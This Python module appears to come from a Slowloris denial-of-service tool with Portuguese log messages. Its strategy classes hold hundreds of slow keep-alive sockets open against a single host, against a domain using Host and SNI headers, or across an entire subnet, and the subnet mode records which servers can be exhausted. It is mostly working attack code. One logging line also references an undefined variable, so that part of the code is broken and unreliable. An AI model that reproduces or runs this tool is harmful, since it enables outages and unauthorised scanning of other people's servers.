from __future__ import annotations
import logging
import socket
import time
from dataclasses import dataclass
from ipaddress import IPv4Network
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List

from .sockets import (
    init_socket,
    iteration_keepalive,
    ip_ativo,
    porta_ativa,
)

DEFAULT_SOCKETS = 200
DEFAULT_SLEEP = 15
DEFAULT_THREADS = 50
DEFAULT_ATTACK_SECONDS = 120
RESULT_FILE = "resultado_slowloris.txt"


@dataclass
class BaseOptions:
    sockets: int = DEFAULT_SOCKETS
    https: bool = False
    randua: bool = False
    sleeptime: int = DEFAULT_SLEEP


class Strategy:
    def execute(self) -> None:
        raise NotImplementedError


class SniperStrategy(Strategy):
    def __init__(self, ip: str, port: int, opts: BaseOptions):
        self.ip = ip
        self.port = port
        self.opts = opts

    def execute(self) -> None:
        logging.info(f"[SNIPER] {self.ip}:{self.port} | sockets={self.opts.sockets} | https={self.opts.https}")
        socks: List[socket.socket] = []
        for _ in range(self.opts.sockets):
            s = init_socket(self.ip, self.port, self.opts.https, self.opts.randua)
            if s:
                socks.append(s)
        while True:
            try:
                logging.info(f"Enviando keep-alive... ({len(socks)} sockets ativos)")
                iteration_keepalive(
                    socks, self.opts.sockets, self.ip, self.port,
                    self.opts.https, self.opts.randua, None, None
                )
                time.sleep(self.opts.sleeptime)
            except (KeyboardInterrupt, SystemExit):
                logging.info("Encerrando (Ctrl+C)…")
                break
            except Exception as e:
                logging.debug(f"Erro no loop: {e}")
        for s in socks:
            try:
                s.close()
            except Exception:
                pass


class DomainStrategy(Strategy):
    def __init__(self, host: str, ip: str, port: int, opts: BaseOptions):
        self.host = host
        self.ip = ip
        self.port = port
        self.opts = opts

    def execute(self) -> None:
        logging.info(
            f"[DOMAIN] {self.host} ({self.ip}):{self.port} | sockets={self.opts.sockets} | https={self.opts.https}")
        socks: List[socket.socket] = []
        for _ in range(self.opts.sockets):
            s = init_socket(self.ip, self.port, self.opts.https, self.opts.randua,
                            host_header=self.host, sni_name=self.host if self.opts.https else None)
            if s:
                socks.append(s)
        while True:
            try:
                logging.info(f"Enviando keep-alive... ({len(socks)} sockets ativos)")
                iteration_keepalive(
                    socks, self.opts.sockets, self.ip, self.port,
                    self.opts.https, self.opts.randua,
                    host_header=self.host, sni_name=self.host if self.opts.https else None
                )
                time.sleep(self.opts.sleeptime)
            except (KeyboardInterrupt, SystemExit):
                logging.info("Encerrando (Ctrl+C)…")
                break
            except Exception as e:
                logging.debug(f"Erro no loop: {e}")
        for s in socks:
            try:
                s.close()
            except Exception:
                pass


class PitchforkStrategy(Strategy):
    def __init__(self, subnet: IPv4Network, ports: List[int], opts: BaseOptions,
                 duration_s: int = DEFAULT_ATTACK_SECONDS, max_threads: int = DEFAULT_THREADS):
        self.subnet = subnet
        self.ports = ports
        self.opts = opts
        self.duration_s = duration_s
        self.max_threads = max_threads

    def _test_target(self, ip: str, port: int) -> bool:
        logging.info(f"[+] Testando {ip}:{port} por {self.duration_s}s (sockets={self.opts.sockets})")
        socks: List[socket.socket] = []
        for _ in range(self.opts.sockets):
            s = init_socket(ip, port, self.opts.https, self.opts.randua)
            if s:
                socks.append(s)
        if len(socks) < self.opts.sockets:
            logging.info(f"[-] Não foi possível criar todos os {self.opts.sockets} sockets.")
            for s in socks:
                try:
                    s.close()
                except Exception:
                    pass
            return False
        start = time.time()
        total_recreated = 0
        while time.time() - start < self.duration_s:
            before = len(socks)
            iteration_keepalive(socks, self.opts.sockets, ip, port, self.opts.https, self.opts.randua, None, None)
            recreated = max(0, len(socks) - before)
            total_recreated += recreated
            logging.info(f"[{ip}:{port}] ativos={len(socks)}/{self.opts.sockets} | recriados_ciclo={recreated}")
            time.sleep(10)
        for s in socks:
            try:
                s.close()
            except Exception:
                pass
        if total_recreated == 0:
            logging.info(f"[VULNERAVEL] {ip}:{port} – manteve 100% dos sockets.")
            return True
        logging.info(f"[SEGURO] {ip}:{port} – {total_recriados} sockets precisaram ser recriados.")
        return False

    def _process_ip(self, ip: str) -> List[str]:
        achados: List[str] = []
        if not ip_ativo(ip):
            logging.info(f"[-] IP inativo: {ip}")
            return achados
        for p in self.ports:
            if porta_ativa(ip, p):
                if self._test_target(ip, p):
                    achados.append(f"[VULNERAVEL] {ip}:{p}\n")
            else:
                logging.info(f"[-] Porta {p} inativa em {ip}")
        return achados

    def execute(self) -> None:
        logging.info(
            f"[PITCHFORK] Sub-rede={self.subnet} | portas={self.ports} | sockets={self.opts.sockets} | https={self.opts.https} | duração={self.duration_s}s")
        resultados: List[str] = []
        with ThreadPoolExecutor(max_workers=self.max_threads) as ex:
            futures = {ex.submit(self._process_ip, str(ip)): str(ip) for ip in self.subnet}
            for fut in as_completed(futures):
                try:
                    resultados.extend(fut.result())
                except Exception as e:
                    logging.error(f"Erro ao processar {futures[fut]}: {e}")
        if resultados:
            with open(RESULT_FILE, "w", encoding="utf-8") as f:
                f.writelines(resultados)
            logging.info(f"[+] Resultados salvos em {RESULT_FILE}")
        else:
            logging.info("[+] Nenhuma vulnerabilidade encontrada.")
